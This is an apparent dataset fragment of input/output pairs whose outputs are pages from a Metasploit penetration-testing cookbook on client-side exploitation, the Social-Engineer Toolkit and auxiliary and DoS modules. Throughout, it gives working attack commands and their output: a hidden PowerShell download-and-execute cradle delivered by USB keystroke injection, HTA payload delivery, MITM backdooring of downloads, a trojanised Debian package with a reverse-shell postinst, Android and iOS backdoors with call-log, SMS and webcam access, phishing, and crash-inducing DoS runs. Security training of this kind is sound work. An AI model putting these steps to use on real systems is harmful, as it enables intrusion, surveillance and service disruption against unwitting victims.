    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nAlthough messages like this may look suspicious, most users just what them to go\naway.\n6. Although not being the stealthiest attack, you will be amazed by the number of\nusers that will click Enable and Yes without even thinking twice:\nmsf exploit(multi/script/web_delivery) >\n[*] 192.168.216.151 web_delivery - Handling .sct Request\n[*] 192.168.216.151 web_delivery - Delivering Payload\n[*] https://192.168.216.5:443 handling request from\n192.168.216.151; (UUID: f84nian0) Staging x86 payload (180825\nbytes) ...\n[*] Meterpreter session 1 opened (192.168.216.5:443 ->\n192.168.216.151:50109) at 2017-12-23 09:37:56 -0500\nAs we expected back in Metasploit, we have a new session.\nThere's more...\nFrom macros to CSV injection, when Microsoft Excel is used to open a CSV any cells\nstarting with = will be interpreted by the software as a formula, since Excel provides\nthe DDE protocol for interprocess communication, which we use to execute commands in\nthe Excel window.\nHuman Interface Device attacks\nPhysical attacks are the most effective and dangerous, of which Human Interface Device\n(HID) attacks are among my favorite. To compromise a client, you just need to insert a\npreprogrammed USB stick that is read as an HID, in this case a keyboard that will type and\nexecute the payload.\n[ 269 ]"
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nGetting ready\nThere are several hardware options you can use, going from a simple Android phone to\ncustom hardware such as Teensy USB HID, which you can order at https:/​/​www.​pjrc.​com/\n; USB Rubber Ducky, available at https:/​/​hakshop.​com; or the Cactus WHID from https:/\n/​github.​com/​whid-​injector/​WHID.\nHow to do it...\n1. Although it is possible to run a basic stageless payload, in my experience using a\nstaged payload with the Script Web Delivery exploit module has proven to be a\nreliable way to deliver payloads using HID devices:\nmsf > use exploit/multi/script/web_delivery\nmsf exploit(multi/script/web_delivery) > set TARGET 2\nTARGET => 2\nmsf exploit(multi/script/web_delivery) > set SRVHOST 192.168.216.5\nSRVHOST => 192.168.216.5\nmsf exploit(multi/script/web_delivery) > set SRVPORT 80\nSRVPORT => 80\nmsf exploit(multi/script/web_delivery) > set URIPATH /\nURIPATH => /\nmsf exploit(multi/script/web_delivery) > set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\nmsf exploit(multi/script/web_delivery) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(multi/script/web_delivery) > set LPORT 8443\nLPORT => 8443\nmsf exploit(multi/script/web_delivery) > exploit\n[*] Exploit running as background job 1.\n[*] Started HTTPS reverse handler on https://192.168.216.5:8443\n[*] Using URL: http://192.168.216.5:80/\n[*] Server started.\n[*] Run the following command on the target machine:\npowershell.exe -nop -w hidden -c $P=new-object\nnet.webclient;$P.proxy=[Net.WebRequest]::GetSystemWebProxy();$P.Pro\nxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX\n$P.downloadstring('http://192.168.216.5/');\n[ 270 ]"
  },
  {
    "input": "HTA attack",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\n2. Now, all we need to use our preferred HID device is to type the following\ncommand:\npowershell.exe -nop -w hidden -c $P=new-object\nnet.webclient;$P.proxy=[Net.WebRequest]::GetSystemWebProxy();$P.Pro\nxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX\n$P.downloadstring('http://192.168.216.5/');\nWhen inserting the HID device on the target machine, it will use windows + R to\nopen the Run dialog box and we type our command:\nWhich should give us a new session, as we can see:\n[*] 192.168.216.151 web_delivery - Delivering Payload\n[*] https://192.168.216.5:8443 handling request from\n192.168.216.151; (UUID: xmienekf) Staging x86 payload (180825\nbytes) ...\n[*] Meterpreter session 1 opened (192.168.216.5:8443 ->\n192.168.216.151:50955) at 2017-12-23 11:21:45 -0500\nHTA attack\nHTML Application (HTA) is an HTML Microsoft Windows program capable of\nrunning scripting languages, such as VBScript or JScript. The Metasploit HTA Web Server\nexploit module hosts an HTA that when opened runs a payload via PowerShell.\n[ 271 ]"
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nHow to do it...\nTo use, simply set the IP for the server, a custom URI, the payload you which to execute,\nand the IP of the listener:\nroot@kali:~# msfconsole -q\nmsf > use exploit/windows/misc/hta_server\nmsf exploit(windows/misc/hta_server) > set SRVHOST 192.168.216.5\nSRVHOST => 192.168.216.5\nmsf exploit(windows/misc/hta_server) > set URIPATH form\nURIPATH => form\nmsf exploit(windows/misc/hta_server) > set PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\nmsf exploit(windows/misc/hta_server) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(windows/misc/hta_server) > exploit\n[*] Exploit running as background job 0.\n[*] Started HTTPS reverse handler on https://192.168.216.5:8443\n[*] Using URL: http://192.168.216.5:8080/form\n[*] Server started.\nWhen the victim browses to the HTA file, it will be prompted by IE twice before the\npayload is executed:\n[ 272 ]"
  },
  {
    "input": "Getting ready",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nNotice the publisher name shown here; since mshta.exe is a signed\nWindows application most users will trust it and will allow it to run:\nThis is why using a custom URI crafted for the victim instead of a random one, can deliver\nbetter results.\nBackdooring executables using a MITM\nattack\nIn this recipe, you will learn how to backdoor executables using a man-in-the-\nmiddle (MITM) attack. When downloading software from online sources, you should\nalways be careful and verify that the software you have downloaded has not been altered\nby an adversary in transit.\nGetting ready\nIn this recipe, we will use a MITM framework for MITM attacks to perform an ARP\nspoofing attack on the Windows 10 target machine, use SSLstrip to transparently hijack\nHTTP traffic on a network, and map HTTPS links into look-alike HTTP links and then\nbackdoor executables sent over HTTP using the Backdoor Factory.\n[ 273 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\nBefore we begin, we need to download and install the latest version of the MITM\nframework; we start by downloading all the external libraries and dependencies using the\nfollowing command:\napt install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-\ndev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3\nlibcapstone-dev libffi-dev file\nThen, we clone the MITM framework repository cd into the directory, initialize and clone\nthe repos submodules, and install the dependencies:\ngit clone https://github.com/byt3bl33d3r/MITMf\ncd MITMf && git submodule init && git submodule update --recursive\npip install -r requirements.txt\nLastly, we need to edit the config/mitmf.conf configuration file and change the host IP\naddress to match the IP address of our Kali Linux machine:\nNow that we have installed and configured the MITM framework, we are ready to start an\nARP poisoning attack and patch some executables.\n[ 274 ]"
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nHow to do it...\nBefore running the MITM framework, we need to start msfconsole and load the\nMSGRPC plugin with the password configured in the MITM framework configuration file; in\nthis example the default password is abc123.\n1. We are using MSGRPC to start the RPC service, allowing the MITM framework to\nuse Remote Procedure Call (RPC) to configure and run modules:\n2. In a new terminal, we will use the MITM framework with:\n-i to specify the interface to listen on\n--spoof to load the spoof plugin\n--arp to redirect traffic using ARP spoofing\n--hsts to load the SSLstrip+ plugin\n--gateway to specify the gateway IP address\n--target for the IP address of the host to poison (if omitted, it will\ndefault to the subnet)\n--filepwn to load the filepwn plugin\n[ 275 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\nThe backdoor executables are sent over HTTP using the Backdoor Factory:\n3. Now, when the victim downloads an executable, in this example Desktops.exe\nfrom http://live.sysinternals.com/Desktops.exe, the binary will be\npatched and we will get a new session. Since we are using SSLstrip, even if the\nsite tries to redirect the user to the HTTPS, we should be able to downgrade the\nHTTPS session and patch the binary as we can see in following screenshot:\n[ 276 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\n4. Back in the terminal where we are running msfconsole, we should see a new\nsession running on the victim machine:\n5. On the victim machine, the user is unaware that the software has been patched\nsince the program is running without any apparent problem:\n[ 277 ]"
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nCreating a Linux trojan\nClient-side attacks and trojans are not exclusive to Windows. In this recipe, we will create a\nLinux payload, and place it inside a Debian package.\nHow to do it...\n1. First, we need to download the package we want to place our payload in; for this\nrecipe we will use cowsay, a simple program that generates an ASCII picture of a\ncow saying something provided by the user:\nroot@kali:~# apt --download-only install cowsay\nReading package lists... Done\nBuilding dependency tree\nReading state information... Done\nThe following packages were automatically installed and are no\nlonger required:\npython-brotlipy python-cssutils python-typing\nUse 'apt autoremove' to remove them.\nSuggested packages:\nfilters cowsay-off\nThe following NEW packages will be installed:\ncowsay\n0 upgraded, 1 newly installed, 0 to remove and 980 not upgraded.\nNeed to get 20.1 kB of archives.\nAfter this operation, 90.1 kB of additional disk space will be\nused.\nGet:1 http://archive-4.kali.org/kali kali-rolling/main amd64 cowsay\nall 3.03+dfsg2-4 [20.1 kB]\nFetched 20.1 kB in 1s (15.2 kB/s)\nDownload complete and in download only mode\nroot@kali:~#\n2. Now that we have downloaded the package, we will extract the package to a new\ndirectory called cowsay:\nroot@kali:~# dpkg -x\n/var/cache/apt/archives/cowsay_3.03+dfsg2-4_all.deb cowsay\n[ 278 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\n3. Debian packages must adhere to a strict directory structure, so we need to create\na subdirectory under the program's source directory, called DEBIAN:\nroot@kali:~/trojan# mkdir cowsay/DEBIAN\nroot@kali:~/trojan# cd cowsay/DEBIAN/\n4. Next, we need to create the control file, which is the core of the Debian package,\ncontaining all relevant metadata such as package name, version, supported\narchitectures, and dependencies:\nroot@kali:~/cowsay/DEBIAN# cat control\nPackage: cowsay\nVersion: 3.03+dfsg2-4\nArchitecture: all\nMaintainer: Francois Marier <francois@debian.org>\nInstalled-Size: 90\nDepends: perl\nSuggests: filters\nSection: games\nPriority: optional\nHomepage: http://www.nog.net/~tony/warez\nDescription: configurable talking cow\nCowsay (or cowthink) will turn text into happy ASCII cows, with\nspeech (or thought) balloons. If you don't like cows, ASCII art is\navailable to replace it with some other creatures (Tux, the BSD\ndaemon, dragons, and a plethora of animals, from a turkey to\nan elephant in a snake).\n5. Then we will create a post-installation file called postinst that will add the\nproper permissions to our payload, which will be called cowsay_trojan, and\nexecute it:\nroot@kali:~/cowsay/DEBIAN# cat postinst\nchmod 2755 /usr/games/cowsay_trojan && /usr/games/cowsay_trojan &\n/usr/games/cowsay Welcome\n6. Now that we have all the required files, we will generate the payload using\nmsfvenom:\nroot@kali:~/cowsay/DEBIAN# msfvenom -a x64 --platform linux -p\nlinux/x64/shell/reverse_tcp LHOST=192.168.216.5 -b \"\\x00\" -f elf -o\n/root/cowsay/usr/games/cowsay_trojan\nFound 2 compatible encoders\nAttempting to encode payload with 1 iterations of generic/none\ngeneric/none failed with Encoding failed due to a bad character\n(index=56, char=0x00)\n[ 279 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\nAttempting to encode payload with 1 iterations of x64/xor\nx64/xor succeeded with size 167 (iteration=0)\nx64/xor chosen with final size 167\nPayload size: 167 bytes\nFinal size of elf file: 287 bytes\nSaved as: /root/cowsay/usr/games/cowsay_trojan\nroot@kali:~/cowsay/DEBIAN#\n7. Before we can build our new package, we need to make the postinst file\nexecutable using the chmod command. To build the package, we use the dpkg-\ndeb command with the --build option, followed by the path to the program's\nsource directory:\nroot@kali:~/cowsay/DEBIAN# chmod 755 postinst\nroot@kali:~/cowsay/DEBIAN# dpkg-deb --build /root/cowsay/\ndpkg-deb: building package 'cowsay' in '/root/cowsay.deb'.\nroot@kali:~/cowsay/DEBIAN#\n8. To test our trojan, we will start a listener in a new terminal window using\nmsfconsole with the -x option, which allows us to specify a string as console\ncommands:\nroot@kali:~# msfconsole -q -x 'use exploit/multi/handler; set\nPAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.216.5; run'\nPAYLOAD => linux/x64/shell/reverse_tcp\nLHOST => 192.168.216.5\n[*] Started reverse TCP handler on 192.168.216.5:4444\nUsing the -x option with msfconsole can save you some time and allows\nyou to launch msfconsole from scripts.\n9. Since Kali is itself is a Linux client machine, we can test the trojan simply by\nchanging to our home directory and using the dpkg command to install the\ncowsay program:\nroot@kali:~/cowsay/DEBIAN# cd\nroot@kali:~# dpkg -i cowsay.deb\nSelecting previously unselected package cowsay.\n(Reading database ... 329750 files and directories currently\ninstalled.)\nPreparing to unpack cowsay.deb ...\nUnpacking cowsay (3.03+dfsg2-4) ...\nSetting up cowsay (3.03+dfsg2-4) ...\n[ 280 ]"
  },
  {
    "input": "Creating an Android backdoor",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\n_________\n< Welcome >\n---------\n\\ ^__^\n\\ (oo)\\_______\n(__)\\ )\\/\\\n||----w |\n|| ||\nProcessing triggers for man-db (2.7.6.1-2) ...\nroot@kali:~#\n10. Sure enough, in the terminal where we are running our listener, we should see a\nnew session which was spawned by our Linux trojan:\nroot@kali:~# msfconsole -q -x 'use exploit/multi/handler; set\nPAYLOAD linux/x64/shell/reverse_tcp; set LHOST 192.168.216.5; run'\nPAYLOAD => linux/x64/shell/reverse_tcp\nLHOST => 192.168.216.5\n[*] Started reverse TCP handler on 192.168.216.5:4444\n[*] Sending stage (38 bytes) to 192.168.216.5\n[*] Command shell session 1 opened (192.168.216.5:4444 ->\n192.168.216.5:34642) at 2017-12-26 11:58:54 -0500\nid\nuid=0(root) gid=0(root) groups=0(root)\nCreating an Android backdoor\nIn this recipe, we will create a persistent backdoor for Android devices. Since our objective\nis to create a controlled test environment, I suggest using a virtual machine running\nAndroid OS; this way we can safely test exploits without worries and, when we have\nfinished, we can simply revert to the virtual machine and start over.\n[ 281 ]"
  },
  {
    "input": "Getting ready",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nGetting ready\nI will be using Android-x86 throughout this recipe; to follow along, download the\nAndroid-x86-5.1-rc1 ISO from the http:/​/​www.​android-​x86.​org/​ site, as shown, and\ncreate a new virtual machine:\n[ 282 ]"
  },
  {
    "input": "How to do it...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nHow to do it...\n1. We will be using msfvenom to create the backdoor using\nandroid/meterpreter/reverse_https for the payload:\nroot@kali:~# msfvenom -p android/meterpreter/reverse_https\nLHOST=192.168.216.5 LPORT=443 R > R00t.apk\nNo platform was selected, choosing Msf::Module::Platform::Android\nfrom the payload\nNo Arch selected, selecting Arch: dalvik from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 9019 bytes\nroot@kali:~#\n2. Then, we need to set up the listener using msfconsole with the -x option to save\nus some time:\nroot@kali:~# msfconsole -q -x 'use exploit/multi/handler; set\nPAYLOAD android/meterpreter/reverse_https; set LHOST 192.168.216.5;\nset LPORT 443; run'\n3. Getting the user to install the backdoor usually starts by sending him a link to a\ncustom website serving our payload, stating that this app will allow him to root\nor unlock his phone; thus, a bit of social engineering is required. In this recipe, we\ncan use Python to create a simple HTTP server so we can download the backdoor\nto our Android machine:\nroot@kali:~# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n192.168.216.155 - - [29/Dec/2017 09:30:39] \"GET /R00t.apk HTTP/1.1\"\n200 -\n[ 283 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\n4. After downloading the APK file, the user will get the following message:\nAgain, when using this type of attack vector, spend some time creating a site\ndescribing all the steps, so that the user knows that he needs to install apps from\nunknown sources, which can increase the chances of compromising the target:\n[ 284 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\n5. After allowing unknown sources, you can install the backdoor and get a session\non the target device:\n[*] https://192.168.216.5:443 handling request from\n192.168.216.155; (UUID: xsljq7ea) Staging dalvik payload (69582\nbytes) ...\n[*] Meterpreter session 1 opened (192.168.216.5:443 ->\n192.168.216.155:33728) at 2017-12-29 09:32:35 -0500\nmeterpreter > sysinfo\nComputer : localhost\nOS : Android 5.1.1 - Linux 4.0.9-android-x86+ (i686)\nMeterpreter : dalvik/android\nmeterpreter >\n[ 285 ]\nClient-Side Exploitation and Antivirus Bypass Chapter 7\n6. Besides all the regular meterpreter commands, using the Android payload we\nget a couple of specific commands:\nmeterpreter > help Android\nAndroid Commands\n================\nCommand Description\n------- -----------\nactivity_start Start an Android activity from a Uri string\ncheck_root Check if device is rooted\ndump_calllog Get call log\ndump_contacts Get contacts list\ndump_sms Get sms messages\ngeolocate Get current lat-long using geolocation\nhide_app_icon Hide the app icon from the launcher\ninterval_collect Manage interval collection capabilities\nsend_sms Sends SMS from target session\nset_audio_mode Set Ringer Mode\nsqlite_query Query a SQLite database from storage\nwakelock Enable/Disable Wakelock\nwlan_geolocate Get current lat-long using WLAN information\nmeterpreter >\n7. Looking at the output of the help command, we can see that we can now get the\ncall logs, read and send SMS messages, and get the location of the device, among\nother options. This, combined with the webcam commands, allows us to get\naccess to pretty much every feature of the device:\nmeterpreter > help webcam\nStdapi: Webcam Commands\n=======================\nCommand Description\n------- -----------\nrecord_mic Record audio from the default microphone for X\nseconds\nwebcam_chat Start a video chat\nwebcam_list List webcams\nwebcam_snap Take a snapshot from the specified webcam\nwebcam_stream Play a video stream from the specified webcam\nmeterpreter >\n[ 286 ]"
  },
  {
    "input": "There's more...",
    "output": "Client-Side Exploitation and Antivirus Bypass Chapter 7\nThere's more...\nMetasploit is not restricted to Android devices, if you have a jailbroken arm64 iOS device,\nyou can also create a backdoor with msfvenom, using the\napple_ios/aarch64/meterpreter_reverse_tcp payload, and compromise the device:\nroot@kali:~# msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp\nLHOST=192.168.216.5 LPORT=443 -f macho -o iOS-backdoor\nNo platform was selected, choosing Msf::Module::Platform::Apple_iOS from\nthe payload\nNo Arch selected, selecting Arch: aarch64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 692552 bytes\nFinal size of macho file: 692552 bytes\n>Saved as: iOS-backdoor\nroot@kali:~#\n[ 287 ]"
  },
  {
    "input": "Getting started with the Social-Engineer Toolkit",
    "output": "8\nSocial-Engineer Toolkit\nIn this chapter, we will cover the following recipes:\nGetting started with the Social-Engineer Toolkit\nWorking with the spear-phishing attack vector\nWebsite attack vectors\nWorking with the multi-attack web method\nInfectious media generator\nIntroduction\nThe Social-Engineer Toolkit (SET) is an open source penetration testing framework\nspecifically designed to perform advanced attacks against the human element and\nhas quickly become a standard tool in the penetration tester's arsenal. SET is a product of\nTrustedSec, LLC—an information security consulting firm located in Cleveland, Ohio.\nGetting started with the Social-Engineer\nToolkit\nSET can be installed on Linux and macOS; it comes pre-installed on Kali Linux, which also\nmaintains SET updates, meaning that you do not have to worry about manually updating\nSET."
  },
  {
    "input": "How to do it...",
    "output": "Social-Engineer Toolkit Chapter 8\nGetting ready\nSET can be downloaded for different platforms from its GitHub repository: https:/​/\ngithub.​com/​trustedsec/​social-​engineer-​toolkit. Simply go through the README file\nand install the dependencies for your preferred distribution, and then run the following\ncommand to install SET:\ngit clone https://github.com/trustedsec/social-engineer-toolkit/ set/ && cd\nset && python setup.py install\nHow to do it...\nTo launch SET on Kali Linux, start the Terminal window and run the\nsetoolkit command:\n[ 289 ]"
  },
  {
    "input": "Working with the spear-phishing attack vector",
    "output": "Social-Engineer Toolkit Chapter 8\nHow it works...\nSET is a Python-based automation tool that creates a menu-driven application for us. Faster\nexecution and the versatility of Python makes it the preferred language for developing\nmodular tools, such as SET.\nWhen using SET with other distributions besides Kali Linux, you will need to edit the SET\nconfig file in order to ensure that all the attack vectors will work properly. For example, to\nset up SET in the Ubuntu 16.04.3 Droplet used in previous recipes, we need to define the\npath to Metasploit:\n### Define the path to Metasploit. For example:\n/opt/metasploit/apps/pro/msf3\nMETASPLOIT_PATH=/opt/metasploit-framework/bin\nWorking with the spear-phishing attack\nvector\nA spear-phishing attack vector is an email attack scenario that is used to send malicious\nemails to target/specific user(s). In order to spoof your own email address, you will require\na sendmail server. Change the config setting to SENDMAIL=ON. If you do not have\nsendmail installed on your Debian-based machine, then it can be downloaded by entering\nthe following command:\napt install sendmail\n[ 290 ]"
  },
  {
    "input": "How to do it...",
    "output": "Social-Engineer Toolkit Chapter 8\nHow to do it...\nThe spear-phishing module has three different attack vectors at our disposal:\n1. Let's analyze first. Passing the first option will start the mass email attack. The\nattack vector starts by selecting a payload. You can select any vulnerability from\nthe list of available Metasploit exploit modules:\n[ 291 ]\nSocial-Engineer Toolkit Chapter 8\n2. Then, we will be prompted to select a payload and specify the IP address or URL\nand the port for the listener.\n3. In the next few steps, we will be starting the sendmail server, setting a template\nfor a malicious file format, and selecting a single or mass-mail attack:\n4. Then, select the template to use, the victim email address, and the Gmail account\nfor the email attack:\n[ 292 ]\nSocial-Engineer Toolkit Chapter 8\nSetting up your own server may not be very reliable, as most mail services use a\nreverse lookup to make sure that the email has been generated from the same\ndomain name as the address name.\n5. Next, SET will launch Metasploit using a resource script and starts the Generic\nPayload Handler:\n[ 293 ]"
  },
  {
    "input": "Website attack vectors",
    "output": "Social-Engineer Toolkit Chapter 8\nWebsite attack vectors\nThe SET web attack vector is a unique way of utilizing multiple web-based attacks in order\nto compromise the intended victim. It is by far the most popular attack vector of SET, with\nthe following attack vectors:\n[ 294 ]"
  },
  {
    "input": "How to do it...",
    "output": "Social-Engineer Toolkit Chapter 8\nHow to do it...\nWe have already seen how to use HTA in a previous recipe, but SET takes it to a new level.\n1. After selecting the HTA Attack Method in SET, we can clone a site through which\nwe will deliver our payload, creating a more credible pretext for why the user\nshould open the HTA application:\n[ 295 ]\nSocial-Engineer Toolkit Chapter 8\n2. Like the mass email attack, SET will launch Metasploit using a resource script\nand start the Generic Payload Handler for us:\n[ 296 ]\nSocial-Engineer Toolkit Chapter 8\n3. Now, when the victim browses to our malicious site they will be prompted to\nopen the HTA application; since it comes from a known website, the site we\ncloned, it is more likely that the victim will run it:\n4. When the victim opens the HTA application, we get a new session:\n[ 297 ]"
  },
  {
    "input": "Working with the multi-attack web method",
    "output": "Social-Engineer Toolkit Chapter 8\nWorking with the multi-attack web method\nThe multi-attack web method takes web attacks to the next level by combining several\nattacks into one. This attack method allows us to unite several exploits and vulnerabilities\nunder a single format. Once the file or URL is opened by the target user, then each attack is\nthrown one by one, unless a successful attack is reported. SET automates the process of\nclubbing different attacks under a single web attack scenario. Let's move ahead and see how\nthis is done:\nWe can select different attacks, and once we are done, we can pass 7 and finally combine\nthe selected attacks under a single vector. Finally, we will be prompted to select a payload\nand backdoor encoder.\n[ 298 ]"
  },
  {
    "input": "Infectious media generator",
    "output": "Social-Engineer Toolkit Chapter 8\nHow to do it...\nOnce different attacks have been selected, SET combines them with a payload and builds a\nsingle malicious link that now needs to be socially engineered. We will have to build a\ntemplate that looks completely legitimate to the target user and force him or her to visit the\nmalicious link. Once the link is clicked by the victim, different attacks are tried one by one,\nunless a successful attack is launched. Once a vulnerability is found and exploited, the\npayload provides a back connectivity to the Metasploit listener.\nInfectious media generator\nThe infectious media generator is a relatively simple attack vector. SET will create a\nMetasploit-based payload, set up a listener for you, and generate a folder that needs to be\nburned or written to a DVD/USB drive. Once inserted, if autorun is enabled, the code will\nautomatically execute and take control of the machine:\n[ 299 ]"
  },
  {
    "input": "How it works...",
    "output": "Social-Engineer Toolkit Chapter 8\nHow to do it...\nThis attack vector is based on the simple principle of generating a malicious executable and\nthen encoding it with available encoders, so as to bypass antivirus protection. The following\nare some examples of infectious media generators with their descriptions as well:\nHow it works...\nAfter generating the encoded malicious file, the Metasploit listener starts waiting for back\nconnections. The only limitation to this attack is that the removable media must have\nautorun enabled; otherwise, manual trigger will be required.\nThis type of attack vector can be helpful in situations where the target user is behind a\nfirewall. Most antivirus programs nowadays disable autorun, which in turn renders this\ntype of attack useless. The pentester, along with autorun-based attacks, should also ensure\nthat a backdoor, legitimate executable/PDF is provided, along with the media. This will\nensure that the victim invariably executes one of the payloads.\n[ 300 ]"
  },
  {
    "input": "Working with auxiliary modules",
    "output": "9\nWorking with Modules for\nPenetration Testing\nIn this chapter, we will cover the following recipes:\nWorking with auxiliary modules\nDoS attack modules\nPost-exploitation modules\nUnderstanding the basics of module building\nAnalyzing an existing module\nBuilding your own post-exploitation module\nBuilding your own auxiliary module\nIntroduction\nThe Metasploit Framework has a modular architecture, meaning that all of its exploits,\npayloads, encoders, and so on are present in the form of modules. A modular architecture\nmakes it easier to extend the functionality of the framework. Any programmer can develop\ntheir own module and port it easily into the framework.\nWorking with auxiliary modules\nWe have already seen some auxiliary modules back in Chapter 2, Information Gathering and\nScanning, so in this recipe we will focus on some of the most used and helpful auxiliary\nmodules."
  },
  {
    "input": "How to do it...",
    "output": "Working with Modules for Penetration Testing Chapter 9\nGetting ready\nTo list available auxiliary modules, we can use the show auxiliary command within\nmsfconsole:\nWith almost 1,000 auxiliary modules, Metasploit is probably one of the most complete\npenetration frameworks out there.\nHow to do it...\nWe will start with one of the most useful HTTP auxiliary modules, the HTTP Directory\nScanner. This module identifies the existence of interesting directories in a given directory\npath. By default, it uses the wmap_dirs.txt word dictionary but you can specify your own;\nto run the module we need to set the target IP address, range, or CIDR identifier.\n1. In this example, I used the IP address of the Metasploitable 2 target machine:\nmsf > use auxiliary/scanner/http/dir_scanner\nmsf auxiliary(scanner/http/dir_scanner) > set RHOSTS\n192.168.216.129\nRHOSTS => 192.168.216.129\nmsf auxiliary(scanner/http/dir_scanner) > run\n[*] Detecting error code\n[*] Using code '404' as not found for 192.168.216.129\n[+] Found http://192.168.216.129:80/cgi-bin/ 404 (192.168.216.129)\n[ 302 ]\nWorking with Modules for Penetration Testing Chapter 9\n[+] Found http://192.168.216.129:80/doc/ 200 (192.168.216.129)\n[+] Found http://192.168.216.129:80/icons/ 200 (192.168.216.129)\n[+] Found http://192.168.216.129:80/index/ 404 (192.168.216.129)\n[+] Found http://192.168.216.129:80/phpMyAdmin/ 200\n(192.168.216.129)\n[+] Found http://192.168.216.129:80/test/ 404 (192.168.216.129)\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/http/dir_scanner) >\nLooking at the output, we can see that it was able to find several interesting\ndirectories such as phpMyAdmin, test, doc, cgi-bin, among others\n2. Another useful auxiliary module is the HTTP WebDAV Scanner, which detects\nwebservers with WebDAV enabled. To use it, set the PATH to use and the target\nIP address, range, or CIDR identifier:\nmsf > use scanner/http/webdav_scanner\nmsf auxiliary(scanner/http/webdav_scanner) > set PATH /dav/\nPATH => /dav/\nmsf auxiliary(scanner/http/webdav_scanner) > set RHOSTS\n192.168.216.129\nRHOSTS => 192.168.216.129\nmsf auxiliary(scanner/http/webdav_scanner) > run\n[+] 192.168.216.129 (Apache/2.2.8 (Ubuntu) DAV/2) has WEBDAV\nENABLED\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/http/webdav_scanner) >\n3. Let's discuss a specific scanner module involving some extra inputs.\nThe MySQL Login Utility module is a brute force module that scans for the\navailability of the MySQL server on the target and tries to log in to the database\nby attacking it with brute force, using the Metasploitable 3 machine as the target:\nmsf > use auxiliary/scanner/mysql/mysql_login\nmsf auxiliary(scanner/mysql/mysql_login) > set USERNAME root\nUSERNAME => root\nmsf auxiliary(scanner/mysql/mysql_login) > set BLANK_PASSWORDS true\nBLANK_PASSWORDS => true\nmsf auxiliary(scanner/mysql/mysql_login) > set RHOSTS\n192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(scanner/mysql/mysql_login) > run\n[ 303 ]"
  },
  {
    "input": "HTTP",
    "output": "Working with Modules for Penetration Testing Chapter 9\n[+] 192.168.216.10:3306 - 192.168.216.10:3306 - Found remote MySQL\nversion 5.5.20\n[+] 192.168.216.10:3306 - 192.168.216.10:3306 - Success: 'root:'\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(scanner/mysql/mysql_login) >\nLooking at the output we can see that we were able to log in to the MySQL server,\nusing the username root and a blank password.\nDoS attack modules\nIn previous chapters, we learned to use Metasploit in a variety of attack scenarios. In this\nrecipe, we will focus on Denial-of-Service (DoS) attacks. DoS attacks focus on making\nresources unavailable for the purpose for which they were designed. DoS modules help\npenetration testers in attack services figure out if clients are susceptible to such attacks. So\nlet's discuss some of these modules in detail.\nHow to do it...\nIn this recipe, we will focus on two of the most commonly attacked protocols, HTTP and\nSMB.\nHTTP\nWe will start by having a look at the MS15-034 HTTP Protocol Stack Request Handling\nDenial-of-Service auxiliary module. This module checks if hosts are vulnerable to\nCVE-2015-1635 (MS15-034), a vulnerability in the HTTP protocol stack (HTTP.sys) that\ncould result in arbitrary code execution.\n1. To use the module, set the target IP address of the Metasploitable 3 target\nmachine and run it:\nmsf > use auxiliary/dos/http/ms15_034_ulonglongadd\nmsf auxiliary(dos/http/ms15_034_ulonglongadd) > set RHOSTS\n192.168.216.10\nRHOSTS => 192.168.216.10\nmsf auxiliary(dos/http/ms15_034_ulonglongadd) > run\n[*] DOS request sent\n[ 304 ]"
  },
  {
    "input": "SMB",
    "output": "Working with Modules for Penetration Testing Chapter 9\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf auxiliary(dos/http/ms15_034_ulonglongadd) >\nLooking at the target machine, we can verify that it is vulnerable to this attack,\nwhich crashed the machine leaving us with a Blue Screen of Death:\nSMB\nSMB is another protocol that has been targeted by several vulnerabilities over the years.\nSMBLoris is a remote and uncredentialed DoS attack against Microsoft Windows operating\nsystems. This attack consumes large chunks of memory in the target by sending SMB\nrequests with the NetBios Session Service (NBSS) Length Header value set to the\nmaximum possible value. Affecting all modern versions of Windows from Windows 2000\nthrough to Windows 10, this attack can make business-critical services unavailable.\n1. Before launching msfconsole and using the SMBLoris NBSS Denial of Service\nauxiliary module, we must change the limit for open files in our system. For this,\nwe can use the ulimit command with the -n option for open files and set it\nto 99999. Then, load the module in msfconsole, set the target's IP address, and\nexecute the attack:\nroot@kali:~# ulimit -n 99999\nroot@kali:~# msfconsole -q\n[ 